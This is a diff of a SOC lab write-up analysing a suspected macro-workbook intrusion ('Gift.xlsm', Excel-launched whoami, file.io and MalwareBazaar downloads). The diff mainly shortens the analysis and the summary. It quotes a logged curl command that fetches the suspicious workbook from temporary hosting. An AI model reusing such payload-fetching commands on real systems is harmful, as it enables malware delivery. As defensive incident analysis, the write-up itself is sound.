 <p><sub><strong>Screenshot 025 - VirusTotal domain detection for bazaar.abuse.ch:</strong> VirusTotal shows the `bazaar.abuse.ch` domain with a low vendor-detection count, while the community context still treats it as malware-related infrastructure.</sub></p>
 
-The VirusTotal result needs context. A low domain-detection ratio does not make the endpoint command safe because the stronger signal is behavioral: `curl` is pulling a `/download/` URL from MalwareBazaar-style infrastructure and saving it as an executable-looking file.
+The stronger signal is behavioral: `curl` pulls a `/download/` URL and saves it as an executable-looking file.
 
 ### Investigate `Gift.xlsm`
 
-`Gift.xlsm` is the key artifact because it appears repeatedly beside `whoami`, internal checks, `curl` downloads, and cleanup-related commands. The `.xlsm` extension matters because macro-enabled workbooks can contain VBA logic. In normal use, macros automate spreadsheet tasks; in an incident, they can launch commands, download content, run discovery, or stage the next action.
-
-The workbook itself, hash, and macro code are not available, so its contents cannot be confirmed. The suspicion is behavioral: Excel opens `Gift.xlsm` multiple times, Excel is tied to repeated `whoami`, and the same timeline includes external downloads and internal reachability checks.
+`Gift.xlsm` is the key artifact because it appears beside `whoami`, internal checks, `curl` downloads, and cleanup. The `.xlsm` extension means the workbook can contain VBA macros. The file, hash, and macro code are unavailable, so the suspicion is behavioral: Excel opens the workbook repeatedly and is tied to discovery and download activity.
 
 ![Repeated Gift.xlsm downloads](images/03-sentinel-sysmon/repeated-gift-xlsm-downloads.png)
 
@@ -524,41 +488,31 @@ The repeated command is:
 curl -o Gift.xlsm https://file.io/atAOsYothaq0
 ```
 
-This command downloads content from `file.io` and saves it locally as `Gift.xlsm`. `file.io` is not malicious by default; it is a temporary file-sharing service. The risk is the context: a macro-enabled workbook is retrieved from temporary hosting instead of a trusted internal share, official software portal, email attachment record, or managed storage system.
-
-Temporary hosting is useful to attackers because links can be short-lived, payloads can be replaced, and defenders may lose access to the original file. Since the workbook is unavailable for collection, the investigation relies on behavior: a user endpoint downloads a macro-enabled workbook, opens it through Excel, and then shows discovery-style process activity.
+This command downloads `Gift.xlsm` from `file.io`, a temporary file-sharing service. The domain is not malicious by default; the risk is a macro-enabled workbook retrieved from temporary hosting and then associated with Excel-launched discovery.
 
 ![VirusTotal community context for file.io](images/03-sentinel-sysmon/virustotal-file-io-community-context.png)
 
 <p><sub><strong>Screenshot 027 - VirusTotal community context for file.io:</strong> The community notes describe `file.io` as not necessarily malicious by itself, but also mention its use as a payload-hosting or downloader location in real threat-reporting context.</sub></p>
 
-The VirusTotal community context supports a careful interpretation. `file.io` should not be treated as malicious only because it appears in the log, but community notes connect it with payload distribution and prior reporting around malware families and intrusion activity such as DarkGate, SystemBC, Zeus, and Black Basta-related campaigns.
-
-In this case, `file.io` is best treated as possible delivery or staging infrastructure. The downloaded object is a macro-enabled Office workbook, not a harmless text file or image, and the `Gift.xlsm` name looks like a simple social-engineering lure.
+VirusTotal community notes connect `file.io` with payload distribution in some malware and intrusion reporting. In this case it is best treated as possible delivery or staging infrastructure because the downloaded object is a macro-enabled workbook.
 
 ![Gift.xlsm Excel execution timeline](images/03-sentinel-sysmon/gift-xlsm-excel-execution-timeline.png)
 
 <p><sub><strong>Screenshot 028 - Gift.xlsm Excel execution timeline:</strong> Excel opens `C:\Users\Jim.WIN10B\Desktop\Gift.xlsm` multiple times around 8:32 AM, 8:51 AM, and 8:52 AM.</sub></p>
 
-Jim's endpoint opens the workbook several times from `C:\Users\Jim.WIN10B\Desktop\Gift.xlsm`. Repeated openings can be normal, but here they appear beside Excel-launched `whoami`, internal host checks, and command-line downloads. The user-profile path also suggests the file behaved like a user-delivered object, not a managed enterprise application.
+Jim's endpoint opens the workbook several times from the user desktop. Repeated openings can be normal, but here they appear with Excel-launched `whoami`, internal checks, and downloads.
 
 ![Extended Gift.xlsm timeline](images/03-sentinel-sysmon/extended-gift-xlsm-timeline.png)
 
 <p><sub><strong>Screenshot 029 - Extended Gift.xlsm timeline:</strong> The extended view shows more Excel executions of `Gift.xlsm` around 9:02 AM and 9:03 AM, followed by repeated `curl -o Gift.xlsm` downloads around 12:07 PM.</sub></p>
 
-The extended timeline shows the workbook first as an executed Office document and later as a `curl` download. The exact reason is not proven without the file and full command history, but the pattern is not clean administrative behavior. A normal user workflow rarely requires repeated command-line downloads of a macro-enabled workbook from temporary hosting.
-
-The key distinction is simple: `file.io` is not automatically malicious, but this endpoint behavior is suspicious because it combines temporary hosting, macro-enabled Office content, repeated execution, Excel-parented discovery, and later download activity.
+The extended timeline shows the workbook as both an executed Office document and a later `curl` download. `file.io` is not automatically malicious, but this endpoint behavior is suspicious because it combines temporary hosting, macro-enabled Office content, repeated execution, Excel-parented discovery, and later downloads.
 
 ![Combined whoami and Gift.xlsm timeline](images/03-sentinel-sysmon/combined-whoami-gift-timeline.png)
 
 <p><sub><strong>Screenshot 030 - Combined whoami and Gift.xlsm timeline:</strong> The combined timeline links Excel opening `Gift.xlsm`, `splwow64.exe`, repeated `whoami`, and later Excel execution of the same workbook.</sub></p>
 
-This combined view is the strongest behavioral link in the case. `whoami` is not malicious by itself, but several executions are connected to Excel and `Gift.xlsm`. A normal spreadsheet usually has no reason to launch identity-discovery commands; malicious macros and droppers often do this to learn which user and environment they are running under.
-
-The timeline also includes `splwow64.exe`, a legitimate Windows process related to printing support for 32-bit applications on 64-bit systems. Its presence does not prove malicious behavior. The priority remains the unusual chain: Jim opens a macro-enabled workbook, Excel appears as a parent process, discovery commands run, internal systems are checked, and external file transfers occur.
-
-My assessment: `Gift.xlsm` should be treated as the likely central execution or staging artifact in Case 3. It cannot be labeled confirmed malware without the workbook, macro extraction, hashes, and sandbox execution, but it is suspicious enough to justify containment, file preservation, and escalation.
+The combined view is the strongest link: several `whoami` executions connect to Excel and `Gift.xlsm`. `splwow64.exe` is a legitimate Windows print-support process, but the priority remains the unusual chain: macro-enabled workbook, Excel parent process, discovery commands, internal checks, and external transfers. `Gift.xlsm` should be treated as the likely central execution or staging artifact until the workbook, macros, hashes, and sandbox behavior are collected.
 
 > The conclusion is behavioral, not file-reputation based. Excel and `Gift.xlsm` appear in a suspicious chain with user discovery, internal reachability checks, external downloads, and cleanup-related activity.
 
@@ -585,9 +539,7 @@ My assessment: `Gift.xlsm` should be treated as the likely central execution or 
 
 ## Final Summary
 
-This lab shows how SOC triage moves from alert data to evidence-supported conclusions. Case 1 is a true-positive exploitation attempt with Mirai-related payload context, but compromise requires server-side proof. Case 2 is likely a false positive for confirmed phishing because the QR flow reaches legitimate Facebook/Meta infrastructure, while sender/header validation remains open. Case 3 is a suspicious endpoint incident: `Gift.xlsm`, Excel-linked `whoami`, `file.io` downloads, MalwareBazaar-style transfer activity, domain-controller checks, and cleanup artifacts form a credible chain even without the original workbook.
-
-Across all cases, the discipline is the same: state what is confirmed, mark what is not, map behavior accurately, and define the telemetry needed to prove impact.
+This lab shows SOC triage moving from alerts to evidence-supported conclusions. Case 1 is a true-positive exploitation attempt with Mirai-related payload context, but compromise requires server-side proof. Case 2 is likely false positive for confirmed phishing because the QR flow reaches legitimate Facebook/Meta infrastructure. Case 3 is suspicious endpoint activity built from `Gift.xlsm`, Excel-linked `whoami`, `file.io` downloads, MalwareBazaar-style transfer, domain-controller checks, and cleanup artifacts.
 
 ## Recommendations
 
